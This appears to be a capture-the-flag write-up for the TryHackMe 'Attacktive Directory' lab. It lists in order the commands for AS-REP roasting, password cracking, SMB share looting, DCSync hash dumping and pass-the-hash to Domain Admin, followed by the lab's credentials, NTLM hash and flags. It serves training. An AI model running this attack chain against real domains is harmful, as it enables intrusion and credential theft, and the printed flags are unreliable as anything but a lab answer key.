# Command Reference — Attacktive Directory

Every relevant command, in order, reproducible. Active Directory attack from unauthenticated outsider to Domain Admin.

```bash
IP=10.129.173.201
DOMAIN=spookysec.local
DC=10.129.173.201
```

---

## Phase 1 — Recon

```bash
ping -c 2 $IP
nmap -p1-65535 --min-rate 10000 -T4 $IP -oN allports.txt
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -sC -sV -oN services.txt $IP
# DC tell: 88 (Kerberos) + 389 (LDAP) + 9389 (ADWS)
```

## Phase 2 — Domain & SMB enumeration

```bash
# Null-session check (anonymous access = finding)
enum4linux -A $IP

# Get the domain name reliably
crackmapexec smb $IP            # -> domain:spookysec.local, host ATTACKTIVEDIREC, Win2019

# Map the domain for Kerberos tooling
echo "$IP spookysec.local" | sudo tee -a /etc/hosts
```

## Phase 3 — Kerberos user enumeration + AS-REP Roasting

```bash
# Get the room wordlists (if not present)
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt -O ~/userlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt -O ~/passwordlist.txt

# Enumerate valid usernames via Kerberos (no passwords sent, no lockouts)
kerbrute userenum --dc $DC -d $DOMAIN ~/userlist.txt
# -> james, svc-admin, robin, darkstar, administrator, backup, paradox, ori

# AS-REP Roast the account with pre-auth disabled
impacket-GetNPUsers $DOMAIN/svc-admin -no-pass -dc-ip $DC -format hashcat -outputfile asrep.hash

# Crack it (John auto-detects krb5asrep; hashcat mode 18200 also works)
john asrep.hash --wordlist=~/passwordlist.txt
# -> svc-admin : management2005
```

## Phase 4 — SMB loot

```bash
# Authenticated share list
crackmapexec smb $IP -u svc-admin -p management2005 --shares
# -> 'backup' share READ

# Pull the file from the backup share
smbclient //$IP/backup -U "$DOMAIN/svc-admin%management2005"
#   smb> dir
#   smb> get backup_credentials.txt
#   smb> exit

# Decode (base64 = encoding, NOT encryption)
cat backup_credentials.txt | base64 -d ; echo
# -> backup@spookysec.local:backup2517860
```

## Phase 5 — Domain compromise (DCSync + Pass-the-Hash)

```bash
# DCSync: the 'backup' account has replication rights -> dump all domain hashes
impacket-secretsdump $DOMAIN/backup:backup2517860@$DC
# -> Administrator:500:...:0e0363213e37b94221497260b0bcb4fc:::

# Pass-the-Hash into the DC as Administrator (NTLM hash = valid authenticator)
evil-winrm -i $IP -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```

## Phase 6 — Proof (inside the Evil-WinRM shell)

```powershell
whoami                                              # thm-ad\administrator
type C:\Users\svc-admin\Desktop\user.txt.txt        # user flag
type C:\Users\backup\Desktop\PrivEsc.txt            # privesc flag
type C:\Users\Administrator\Desktop\root.txt        # root flag
```

---

## Captured objectives

| Item | Value |
|------|-------|
| Domain (DNS / NetBIOS) | `spookysec.local` / `THM-AD` |
| Foothold cred | `svc-admin : management2005` |
| Backup cred | `backup : backup2517860` |
| Administrator NTLM | `0e0363213e37b94221497260b0bcb4fc` |
| User flag | `TryHackMe{K3rb3r0s_Pr3_4uth}` |
| PrivEsc flag | `TryHackMe{B4ckM3UpSc0tty!}` |
| Root flag | `TryHackMe{4ctiveD1rectoryM4st3r}` |
